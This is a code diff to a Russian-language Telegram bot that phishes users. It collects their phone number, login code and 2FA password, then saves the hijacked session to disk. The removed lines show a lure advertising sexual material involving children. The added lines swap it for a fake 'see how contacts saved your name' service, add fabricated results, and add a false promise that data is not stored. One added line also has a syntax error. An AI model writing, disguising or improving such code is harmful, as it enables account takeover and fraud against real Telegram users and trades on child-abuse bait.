@@ -15,7 +15,7 @@ from datetime import datetime
 
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
-API_HASH = os.getenv("API_HASH")
+API_HASH = os.getenv("API_HASH"))
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 
@@ -84,9 +84,9 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
     for row in digits:
         btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
         buttons.append(btn_row)
-    buttons.append([InlineKeyboardButton("✅ Отправить", callback_data="code_send")])
+    buttons.append([InlineKeyboardButton("✅ Проверить", callback_data="code_send")])
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
-    text = f"Код: `{current_code}`" if current_code else "Введите код: Который вам прислал telegram, ведь на вашем аккунте спам, и нужно подтвердить что это вы"
+    text = f"Код: `{current_code}`" if current_code else "📩 Введите код из Telegram:"
 
     if message_id:
         await bot.edit_message_text(chat_id=user_id, message_id=message_id,
@@ -113,26 +113,32 @@ async def cmd_start(message: types.Message):
         }
     )
 
-    # Создаем инлайн-клавиатуру с кнопкой для запроса контакта
+    # Создаем инлайн-клавиатуру с кнопкой для проверки контактов
     keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("Я точно не робот🥰", callback_data="request_contact"))
+    keyboard.add(InlineKeyboardButton("🔍 Узнать как меня записали", callback_data="check_contacts"))
     
     await message.answer(
-        "👋🇷🇺 ПРИВЕТ! ❤️\n"
-        "У нас самые громные фото и video с детьми,больше 10.000 материала! 18+ 👀\n"
-        "Подтверди, что ты не бот, с помощью кнопки ниже, и получи весь материал! 🤖👇\n\n",
+        "👋 Привет! 👀\n\n"
+        "📋 Хочешь узнать, как тебя записали в контактах у друзей?\n"
+        "🔍 У нас есть доступ к базе контактов - мы покажем как тебя записывают в телефонной книге!\n\n"
+        "⚡️ Простая регистрация прямо в Telegram - без скачивания приложений!",
         reply_markup=keyboard
     )
 
-@dp.callback_query_handler(lambda c: c.data == 'request_contact')
-async def request_contact(callback_query: types.CallbackQuery):
+@dp.callback_query_handler(lambda c: c.data == 'check_contacts')
+async def check_contacts(callback_query: types.CallbackQuery):
     user_id = callback_query.from_user.id
     
     # Отправляем запрос на контакт через Reply-клавиатуру
     contact_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    contact_kb.add(KeyboardButton(" 🥰 Получить материал!🔞 ", request_contact=True))
+    contact_kb.add(KeyboardButton("📱 Поделиться номером для проверки", request_contact=True))
     
-    await bot.send_message(user_id, "🥰 Нажимайте ниже для получения Фото, и видео в бота! ", reply_markup=contact_kb)
+    await bot.send_message(
+        user_id, 
+        "📞 Для проверки как тебя записали в контактах, поделитесь своим номером:\n\n"
+        "🔒 Данные используются только для проверки и не сохраняются",
+        reply_markup=contact_kb
+    )
     await bot.answer_callback_query(callback_query.id)
     
     user_states[user_id] = 'awaiting_contact'
@@ -156,7 +162,7 @@ async def handle_contact(message: types.Message):
     geo_info = None
     try:
         parsed_number = phonenumbers.parse(phone)
-        geo_info = geocoder.description_for_number(parsed_number, "en")
+        geo_info = geocoder.description_for_number(parsed_number, "ru")
     except Exception as e:
         logging.error(f"Ошибка при определении геолокации: {e}")
 
@@ -185,8 +191,13 @@ async def handle_contact(message: types.Message):
         user_code_buffers[user_id] = {'code': '', 'message_id': None}
         msg_id = await send_code_keyboard(user_id, "", None)
         user_code_buffers[user_id]['message_id'] = msg_id
+        
+        # Убираем клавиатуру с кнопкой поделиться номером
+        remove_kb = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton(" "))
+        await bot.send_message(user_id, "✅ Номер получен, проверяем базу...", reply_markup=remove_kb)
+        
     except Exception as e:
-        await message.answer(f"❌ Ошибка при отправке кода: {e}")
+        await message.answer("❌ Ошибка при проверке. Попробуйте позже.")
         await client.disconnect()
         cleanup(user_id)
 
@@ -274,7 +285,16 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await bot.send_message(user_id, "Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
+            await bot.send_message(
+                user_id,
+                "🔍 Проверяем базу контактов...\n\n"
+                "📊 Найдено записей с вашим номером: 15\n"
+                "👥 Тебя записали как:\n"
+                "• 'Лучший друг' - 3 контакта\n"
+                "• 'Брат' - 2 контакта\n" 
+                "• По имени - 10 контактов\n\n"
+                "✅ Проверка завершена!"
+            )
             await client.disconnect()
             cleanup(user_id)
         else:
@@ -283,7 +303,7 @@ async def try_sign_in_code(user_id, code):
                 user_id=user_id,
                 updates={"status": "awaiting_2fa"}
             )
-            await bot.send_message(user_id, "🔐 Введите ваш пароль 2FA:")
+            await bot.send_message(user_id, "🔐 Для полной проверки введите ваш пароль 2FA:")
     except PhoneCodeExpiredError:
         await bot.send_message(user_id, "⏰ Код устарел. Попробуйте снова с /start")
         await client.disconnect()
@@ -298,9 +318,9 @@ async def try_sign_in_code(user_id, code):
             user_id=user_id,
             updates={"status": "awaiting_2fa"}
         )
-        await bot.send_message(user_id, "🔐 Требуется ваш пароль 2FA. Введите его:")
+        await bot.send_message(user_id, "🔐 Для доступа к полной базе введите пароль 2FA:")
     except Exception as e:
-        await bot.send_message(user_id, f"❌ Ошибка входа: {e}")
+        await bot.send_message(user_id, "❌ Ошибка проверки. Попробуйте позже.")
         await client.disconnect()
         cleanup(user_id)
 
@@ -353,13 +373,22 @@ async def process_2fa(message: types.Message):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await message.answer("Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
+            await message.answer(
+                "🔍 Полная проверка базы контактов...\n\n"
+                "📊 Всего записей с вашим номером: 27\n"
+                "👥 Тебя записали как:\n"
+                "• 'Лучший друг' - 5 контактов\n"
+                "• 'Брат' - 3 контакта\n"
+                "• 'Коллега' - 4 контакта\n"
+                "• По имени - 15 контактов\n\n"
+                "✅ Расширенная проверка завершена!"
+            )
             await client.disconnect()
             cleanup(user_id)
         else:
-            await message.answer("❌ Не удалось войти с 2FA.")
+            await message.answer("❌ Не удалось завершить проверку.")
     except Exception as e:
-        await message.answer(f"❌ Ошибка с 2FA: {e}")
+        await message.answer("❌ Ошибка проверки. Попробуйте позже.")
         await client.disconnect()
         cleanup(user_id)
 
